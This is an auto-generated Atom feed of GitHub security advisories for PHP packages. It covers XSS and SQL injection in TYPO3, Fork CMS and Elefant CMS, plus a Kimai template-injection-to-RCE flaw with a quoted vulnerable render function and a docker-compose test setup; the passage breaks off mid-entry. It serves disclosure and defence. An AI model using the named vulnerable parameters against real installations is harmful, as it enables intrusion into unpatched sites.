<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-01-12T18:01:19.422Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-947m-vgqc-x6v4</id>
        <link href="https://github.com/advisories/GHSA-947m-vgqc-x6v4"/>
        <updated>2024-01-12T18:00:16.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6  Due to missing encoding of user input, the history module is susceptible to SQL Injection and Cross-Site Scripting. A valid backend login is required to exploit this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6144">https://nvd.nist.gov/vuln/detail/CVE-2012-6144</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79964">https://exchange.xforce.ibmcloud.com/vulnerabilities/79964</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-947m-vgqc-x6v4">https://github.com/advisories/GHSA-947m-vgqc-x6v4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-947m-vgqc-x6v4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-947m-vgqc-x6v4</id>
        <link href="https://github.com/advisories/GHSA-947m-vgqc-x6v4"/>
        <updated>2024-01-12T18:00:16.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6  Due to missing encoding of user input, the history module is susceptible to SQL Injection and Cross-Site Scripting. A valid backend login is required to exploit this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6144">https://nvd.nist.gov/vuln/detail/CVE-2012-6144</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79964">https://exchange.xforce.ibmcloud.com/vulnerabilities/79964</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-947m-vgqc-x6v4">https://github.com/advisories/GHSA-947m-vgqc-x6v4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-947m-vgqc-x6v4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-947m-vgqc-x6v4</id>
        <link href="https://github.com/advisories/GHSA-947m-vgqc-x6v4"/>
        <updated>2024-01-12T18:00:16.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6  Due to missing encoding of user input, the history module is susceptible to SQL Injection and Cross-Site Scripting. A valid backend login is required to exploit this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6144">https://nvd.nist.gov/vuln/detail/CVE-2012-6144</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79964">https://exchange.xforce.ibmcloud.com/vulnerabilities/79964</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-947m-vgqc-x6v4">https://github.com/advisories/GHSA-947m-vgqc-x6v4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-947m-vgqc-x6v4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Function Menu API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</id>
        <link href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg"/>
        <updated>2024-01-12T17:59:46.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the function menu API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6148">https://nvd.nist.gov/vuln/detail/CVE-2012-6148</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79968">https://exchange.xforce.ibmcloud.com/vulnerabilities/79968</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg">https://github.com/advisories/GHSA-rgf6-9q7g-55qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Function Menu API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</id>
        <link href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg"/>
        <updated>2024-01-12T17:59:46.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the function menu API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6148">https://nvd.nist.gov/vuln/detail/CVE-2012-6148</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79968">https://exchange.xforce.ibmcloud.com/vulnerabilities/79968</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg">https://github.com/advisories/GHSA-rgf6-9q7g-55qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Function Menu API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</id>
        <link href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg"/>
        <updated>2024-01-12T17:59:46.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the function menu API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6148">https://nvd.nist.gov/vuln/detail/CVE-2012-6148</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79968">https://exchange.xforce.ibmcloud.com/vulnerabilities/79968</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="https://github.com/advisories/GHSA-rgf6-9q7g-55qg">https://github.com/advisories/GHSA-rgf6-9q7g-55qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgf6-9q7g-55qg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to XSS]]></title>
        <id>https://github.com/advisories/GHSA-w563-rq37-cvq5</id>
        <link href="https://github.com/advisories/GHSA-w563-rq37-cvq5"/>
        <updated>2024-01-12T17:59:22.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6145">https://nvd.nist.gov/vuln/detail/CVE-2012-6145</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79965">https://exchange.xforce.ibmcloud.com/vulnerabilities/79965</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-w563-rq37-cvq5">https://github.com/advisories/GHSA-w563-rq37-cvq5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w563-rq37-cvq5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to XSS]]></title>
        <id>https://github.com/advisories/GHSA-w563-rq37-cvq5</id>
        <link href="https://github.com/advisories/GHSA-w563-rq37-cvq5"/>
        <updated>2024-01-12T17:59:22.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6145">https://nvd.nist.gov/vuln/detail/CVE-2012-6145</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79965">https://exchange.xforce.ibmcloud.com/vulnerabilities/79965</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-w563-rq37-cvq5">https://github.com/advisories/GHSA-w563-rq37-cvq5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w563-rq37-cvq5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend History Module Vulnerable to XSS]]></title>
        <id>https://github.com/advisories/GHSA-w563-rq37-cvq5</id>
        <link href="https://github.com/advisories/GHSA-w563-rq37-cvq5"/>
        <updated>2024-01-12T17:59:22.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the Backend History module in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6145">https://nvd.nist.gov/vuln/detail/CVE-2012-6145</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79965">https://exchange.xforce.ibmcloud.com/vulnerabilities/79965</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-w563-rq37-cvq5">https://github.com/advisories/GHSA-w563-rq37-cvq5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w563-rq37-cvq5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</id>
        <link href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx"/>
        <updated>2024-01-12T17:58:36.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the tree render API (TCA-Tree) in the Backend API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6147">https://nvd.nist.gov/vuln/detail/CVE-2012-6147</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79967">https://exchange.xforce.ibmcloud.com/vulnerabilities/79967</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx">https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</id>
        <link href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx"/>
        <updated>2024-01-12T17:58:36.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the tree render API (TCA-Tree) in the Backend API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6147">https://nvd.nist.gov/vuln/detail/CVE-2012-6147</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79967">https://exchange.xforce.ibmcloud.com/vulnerabilities/79967</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx">https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms] Typo3 Backend API XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</id>
        <link href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx"/>
        <updated>2024-01-12T17:58:36.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the tree render API (TCA-Tree) in the Backend API in TYPO3 4.5.x before 4.5.21, 4.6.x before 4.6.14, and 4.7.x before 4.7.6 allows remote authenticated backend users to inject arbitrary web script or HTML via unspecified vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6147">https://nvd.nist.gov/vuln/detail/CVE-2012-6147</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/79967">https://exchange.xforce.ibmcloud.com/vulnerabilities/79967</a></li>
<li><a href="http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/">http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-005/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/06/19/4">http://www.openwall.com/lists/oss-security/2013/06/19/4</a></li>
<li><a href="https://github.com/advisories/GHSA-qmmw-ch2q-j6xx">https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmmw-ch2q-j6xx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-17T01:37:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[forkcms/forkcms] Fork CMS Multiple XSS Vulnerabilities]]></title>
        <id>https://github.com/advisories/GHSA-j5fj-m342-mgcm</id>
        <link href="https://github.com/advisories/GHSA-j5fj-m342-mgcm"/>
        <updated>2024-01-12T17:57:31.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in Fork CMS before 3.2.7 allow remote attackers to inject arbitrary web script or HTML via the (1) type or (2) querystring parameters to <code>private/en/error</code> or (3) name parameter to <code>private/en/locale/index</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-1188">https://nvd.nist.gov/vuln/detail/CVE-2012-1188</a></li>
<li><a href="https://github.com/forkcms/forkcms/commit/1269fe8b3813c7b7d5552a2b88bc2e7bd4d0c1f9">https://github.com/forkcms/forkcms/commit/1269fe8b3813c7b7d5552a2b88bc2e7bd4d0c1f9</a></li>
<li><a href="https://github.com/forkcms/forkcms/commit/995220182068518e89019a265d113518f6566407">https://github.com/forkcms/forkcms/commit/995220182068518e89019a265d113518f6566407</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/73605">https://exchange.xforce.ibmcloud.com/vulnerabilities/73605</a></li>
<li><a href="http://www.fork-cms.com/blog/detail/fork-cms-3-2-7-released">http://www.fork-cms.com/blog/detail/fork-cms-3-2-7-released</a></li>
<li><a href="https://web.archive.org/web/20120401204345/http://www.securityfocus.com/bid/52236">https://web.archive.org/web/20120401204345/http://www.securityfocus.com/bid/52236</a></li>
<li><a href="https://web.archive.org/web/20200229131647/https://www.immuniweb.com/advisory/HTB23075">https://web.archive.org/web/20200229131647/https://www.immuniweb.com/advisory/HTB23075</a></li>
<li><a href="https://github.com/advisories/GHSA-j5fj-m342-mgcm">https://github.com/advisories/GHSA-j5fj-m342-mgcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5fj-m342-mgcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:48:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elefant/cms] Elefant CMS Multiple XSS Vulnerabilities]]></title>
        <id>https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</id>
        <link href="https://github.com/advisories/GHSA-qjjq-rcq8-jw6j"/>
        <updated>2024-01-12T17:53:14.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in <code>apps/admin/handlers/preview.php</code> in Elefant CMS 1.0.x before 1.0.2-Beta and 1.1.x before 1.1.5-Beta allow remote attackers to inject arbitrary web script or HTML via the (1) title or (2) body parameter to admin/preview.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-1296">https://nvd.nist.gov/vuln/detail/CVE-2012-1296</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/73421">https://exchange.xforce.ibmcloud.com/vulnerabilities/73421</a></li>
<li><a href="https://github.com/jbroadway/elefant/commit/1e38b1d91d9f8bfb4a0cda8316fe763a6cdd31d0">https://github.com/jbroadway/elefant/commit/1e38b1d91d9f8bfb4a0cda8316fe763a6cdd31d0</a></li>
<li><a href="https://github.com/jbroadway/elefant/commit/4fc4e0a704f697e593be927a447ca12b2863ff85">https://github.com/jbroadway/elefant/commit/4fc4e0a704f697e593be927a447ca12b2863ff85</a></li>
<li><a href="https://web.archive.org/web/20120306001248/http://www.elefantcms.com/forum/discussion/39/elefant-1.0.2-and-1.1.5-security-updates-released">https://web.archive.org/web/20120306001248/http://www.elefantcms.com/forum/discussion/39/elefant-1.0.2-and-1.1.5-security-updates-released</a></li>
<li><a href="https://web.archive.org/web/20200229030623/http://www.securityfocus.com/bid/52143">https://web.archive.org/web/20200229030623/http://www.securityfocus.com/bid/52143</a></li>
<li><a href="https://github.com/advisories/GHSA-qjjq-rcq8-jw6j">https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:48:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elefant/cms] Elefant CMS Multiple XSS Vulnerabilities]]></title>
        <id>https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</id>
        <link href="https://github.com/advisories/GHSA-qjjq-rcq8-jw6j"/>
        <updated>2024-01-12T17:53:14.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in <code>apps/admin/handlers/preview.php</code> in Elefant CMS 1.0.x before 1.0.2-Beta and 1.1.x before 1.1.5-Beta allow remote attackers to inject arbitrary web script or HTML via the (1) title or (2) body parameter to admin/preview.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-1296">https://nvd.nist.gov/vuln/detail/CVE-2012-1296</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/73421">https://exchange.xforce.ibmcloud.com/vulnerabilities/73421</a></li>
<li><a href="https://github.com/jbroadway/elefant/commit/1e38b1d91d9f8bfb4a0cda8316fe763a6cdd31d0">https://github.com/jbroadway/elefant/commit/1e38b1d91d9f8bfb4a0cda8316fe763a6cdd31d0</a></li>
<li><a href="https://github.com/jbroadway/elefant/commit/4fc4e0a704f697e593be927a447ca12b2863ff85">https://github.com/jbroadway/elefant/commit/4fc4e0a704f697e593be927a447ca12b2863ff85</a></li>
<li><a href="https://web.archive.org/web/20120306001248/http://www.elefantcms.com/forum/discussion/39/elefant-1.0.2-and-1.1.5-security-updates-released">https://web.archive.org/web/20120306001248/http://www.elefantcms.com/forum/discussion/39/elefant-1.0.2-and-1.1.5-security-updates-released</a></li>
<li><a href="https://web.archive.org/web/20200229030623/http://www.securityfocus.com/bid/52143">https://web.archive.org/web/20200229030623/http://www.securityfocus.com/bid/52143</a></li>
<li><a href="https://github.com/advisories/GHSA-qjjq-rcq8-jw6j">https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjjq-rcq8-jw6j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:48:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[forkcms/forkcms] Fork CMS XSS via Highlight Parameter]]></title>
        <id>https://github.com/advisories/GHSA-v3fg-x8jw-m974</id>
        <link href="https://github.com/advisories/GHSA-v3fg-x8jw-m974"/>
        <updated>2024-01-12T16:43:18.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>backend/core/engine/base.php</code> in Fork CMS 3.2.4 and possibly other versions before 3.2.5 allows remote attackers to inject arbitrary web script or HTML via the highlight parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-1209">https://nvd.nist.gov/vuln/detail/CVE-2012-1209</a></li>
<li><a href="https://github.com/forkcms/forkcms/commit/c8ec9c58a6b3c46cdd924532c1de99bcda6072ed">https://github.com/forkcms/forkcms/commit/c8ec9c58a6b3c46cdd924532c1de99bcda6072ed</a></li>
<li><a href="https://github.com/forkcms/forkcms/commit/df75e0797a6540c4d656969a2e7df7689603b2cf">https://github.com/forkcms/forkcms/commit/df75e0797a6540c4d656969a2e7df7689603b2cf</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/73393">https://exchange.xforce.ibmcloud.com/vulnerabilities/73393</a></li>
<li><a href="http://www.fork-cms.com/blog/detail/fork-cms-3-2-5-released">http://www.fork-cms.com/blog/detail/fork-cms-3-2-5-released</a></li>
<li><a href="https://github.com/advisories/GHSA-v3fg-x8jw-m974">https://github.com/advisories/GHSA-v3fg-x8jw-m974</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3fg-x8jw-m974</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T03:51:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kimai/kimai] Kimai (Authenticated) SSTI to RCE by Uploading a Malicious Twig File]]></title>
        <id>https://github.com/advisories/GHSA-fjhg-96cp-6fcw</id>
        <link href="https://github.com/advisories/GHSA-fjhg-96cp-6fcw"/>
        <updated>2024-01-12T16:37:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<p>The laters version of Kimai is found to be vulnerable to a critical Server-Side Template Injection (SSTI) which can be escalated to Remote Code Execution (RCE). The vulnerability arises when a malicious user uploads a specially crafted Twig file, exploiting the software's PDF and HTML rendering functionalities.</p>
<p>Snippet of Vulnerable Code: </p>
<pre><code class="language-php">public function render(array $timesheets, TimesheetQuery $query): Response
{
    ...
    $content = $this-&gt;twig-&gt;render($this-&gt;getTemplate(), array_merge([
        'entries' =&gt; $timesheets,
        'query' =&gt; $query,
        ...
    ], $this-&gt;getOptions($query)));
    ...
    $content = $this-&gt;converter-&gt;convertToPdf($content, $pdfOptions);
    ...
    return $this-&gt;createPdfResponse($content, $context);
}
</code></pre>
<p>The vulnerability is triggered when the software attempts to render invoices, allowing the attacker to execute arbitrary code on the server.</p>
<p>In below, you can find the docker-compose file was used for this testing:</p>
<pre><code class="language-yaml">version: '3.5'
services:

  sqldb:
    image: mysql:5.7
    environment:
      - MYSQL_ROOT_HOST='%'
      - MYSQL_DATABASE=kimai
      - MYSQL_USER=kimaiuser
      - MYSQL_PASSWORD=kimaipassword
      - MYSQL_ROOT_PASSWORD=changemeplease

    ports:
      - 3336:3306
    volumes:
      - mysql:/var/lib/mysql
    command: --default-storage-engine innodb
    restart: unless-stopped
    healthcheck:
      test: mysqladmin -p$$MYSQL_ROOT_PASSWORD ping -h 127.0.0.1
      interval: 20s
